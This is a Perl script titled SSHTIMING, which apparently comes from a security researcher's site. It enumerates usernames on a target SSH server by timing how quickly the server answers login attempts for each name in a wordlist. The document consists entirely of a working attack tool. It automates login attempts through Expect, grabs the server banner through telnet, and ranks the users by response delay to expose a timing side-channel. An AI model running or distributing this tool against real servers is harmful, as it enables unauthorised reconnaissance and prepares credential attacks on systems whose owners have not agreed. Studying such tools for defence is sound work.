#!/usr/bin/perl
#
# http://www.purificato.org
#
use warnings;
use strict;
use Tie::File;
use Fcntl 'O_RDONLY';
use Expect;
use Time::HiRes qw(gettimeofday);
#
# remember: You need to accept ssh key first...
#

#
# Verbose? Port? Timeout?
#
my $verbose = undef;
my $port    = 22;
my $timeout = 10;

#
# Banner
#
print <<BANNER;
SSHTIMING v0.1 - SSH remote timing tool

 Andrea "bunker" Purificato - http://www.purificato.org
 
BANNER

#
# Usage
#
print "Usage: $0 <target> <userlist>\n" and exit(-1) if ($#ARGV<1);

my $target   = $ARGV[0];
my $wordlist = $ARGV[1];
chomp (my $ssh  = `which ssh`);
chomp (my $tel  = `which telnet`);
my %htimes;
my @atimes;

#
# sshd banner grabbing
#
print "[+] Grabbing banner...\n";
my $exp = Expect->spawn("$tel -l fake $target $port") 
	or die "Cannot spawn $tel: $!\n";;
#$exp->log_stdout(0);
$exp->expect(5,['SSH|ssh'=>sub{$exp->send(".\n")}]);
$exp->close();
print "[+] Done!\n\n";

#
# Single timing procedure
#
sub timing {
    my $user = shift @_;
    my $t0 = gettimeofday;
    my $t1 = undef;
    #
    # Expect process
    #
    my $exp = Expect->spawn("$ssh -l $user -p $port $target") 
	or die "Cannot spawn $ssh: $!\n";;
    $exp->log_stdout(0);
    $exp->expect($timeout,['assword:'=>sub{$exp->send(".\n")}]);
    $exp->expect(undef,   [ qr'assword|denied'=>sub{$t1=gettimeofday}]);
    $t1 = gettimeofday unless ($t1);
    $exp->close();
    return sprintf "%0.3f", ($t1-$t0);
}

tie my @wlst_ln, 'Tie::File', "$wordlist", mode=>O_RDONLY
    or die "$wordlist: $!";

print "[+] Started, please wait: ";
for (@wlst_ln) {
    #
    # Aware of duplicated users
    #
    print "($_ dup?)" if ($htimes{$_});
    
    my $ret = timing($_);
    $htimes{$_} = $ret unless ($htimes{$_});
    push @atimes, $ret;
    unless ($verbose) { print "." }
    else { print "$_\t\t$ret\n" }
}
print " Done!\n\n";

# 
# Do whatever you want with time values:
# 
# (sorted by values)
# 
foreach my $key (sort {$htimes{$b}<=>$htimes{$a}} keys %htimes) {
     print "$key:\t\t$htimes{$key}\n";
}
exit(0);
